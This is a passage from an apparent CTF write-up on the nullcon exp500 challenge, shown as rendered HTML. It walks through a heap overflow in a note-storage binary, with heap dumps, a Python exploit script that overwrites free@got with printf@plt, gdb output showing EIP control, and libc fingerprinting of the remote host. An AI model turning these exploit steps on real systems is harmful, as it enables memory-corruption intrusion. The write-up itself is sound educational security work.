</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># set &#39;a&#39; with large buffer, overwriting meta-data of &#39;b&#39;:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000062</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000024</span>  <span class="mh">0x08314090</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;CCCC&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;BBBB&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This made the binary crash. The coredump reported the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x4</span> <span class="mh">0x4</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xb779cff4</span>  <span class="mh">0xb779cff4</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xbf95245c</span>  <span class="mh">0xbf95245c</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xbf952498</span>  <span class="mh">0xbf952498</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10207</span> <span class="p">[</span> <span class="n">CF</span> <span class="n">PF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x73</span>    <span class="mh">0x73</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x33</span>    <span class="mh">0x33</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">p</span> <span class="n">system</span>
</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7636060</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0xbf95245c</span><span class="p">:</span>    <span class="mh">0x08048bb8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x00000004</span>
</span><span class='line'>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x843b0c8</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># local binary</span>
</span><span class='line'><span class="mi">85850</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c77b0</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mf">63.</span><span class="o">..</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># remote binary</span>
</span><span class='line'><span class="mi">83370</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c0024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'><span class="mf">936e0</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b764a024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/exp500<span class="nv">$ </span>ssh <span class="nb">test</span>@54.163.248.69 -vvv
</span><span class='line'>OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e <span class="m">11</span> Feb 2013
</span><span class='line'>debug1: Reading configuration data /etc/ssh/ssh_config
</span><span class='line'>debug1: /etc/ssh/ssh_config line 19: Applying options <span class="k">for</span> *
</span><span class='line'>debug2: ssh_connect: needpriv 0
</span><span class='line'>debug1: Connecting to 54.163.248.69 <span class="o">[</span>54.163.248.69<span class="o">]</span> port 22.
</span><span class='line'>debug1: Connection established.
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
</span><span class='line'>&lt;snip&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/exp500/libc<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>ls<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> xxd <span class="nv">$i</span> <span class="p">|</span> egrep <span class="s1">&#39;83.?c0.?01.?75&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>libc-2.15-0ubuntu10.9.so
</span><span class='line'>
</span><span class='line'>0043740: <span class="m">8934</span> 24e8 f8f4 <span class="m">0200</span> 83c0 <span class="m">0175</span> b0c7 <span class="m">8570</span>  .4<span class="nv">$.</span>.......u...p
</span><span class='line'>00460a0: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e895 cb02 <span class="m">0083</span> c001 75bb  ....4<span class="nv">$.</span>.......u.
</span><span class='line'>0046720: <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span> fbff ffff ffff  .....u...p......
</span><span class='line'>0046810: 2cc4 <span class="m">0200</span> 83c0 <span class="m">0175</span> a5c7 <span class="m">8570</span> fbff ffff  ,......u...p....
</span><span class='line'>0046890: e8ab c302 <span class="m">0083</span> c001 75ac c785 70fb ffff  ........u...p...
</span><span class='line'>0047320: <span class="m">4424</span> 04e8 18b9 <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span>  D<span class="nv">$.</span>........u...p
</span><span class='line'>0047410: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e825 b802 <span class="m">0083</span> c001 75a4  ....4<span class="nv">$.</span>%......u.
</span><span class='line'>005a180: 83c0 <span class="m">0175</span> a4c7 85b0 efff ffff ffff ffe9  ...u............
</span><span class='line'>005b410: <span class="m">3424</span> e8f9 <span class="m">1001</span> <span class="m">0083</span> c001 75ae c785 b0ef  4<span class="nv">$.</span>.......u.....
</span><span class='line'>005c370: <span class="m">0089</span> <span class="m">3424</span> e897 <span class="m">0101</span> <span class="m">0083</span> c001 <span class="m">7580</span> c785  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>00674c0: 0a00 <span class="m">0000</span> <span class="m">8904</span> 24e8 74b7 <span class="m">0000</span> 83c0 <span class="m">0175</span>  ......<span class="nv">$.</span>t......u
</span><span class='line'>
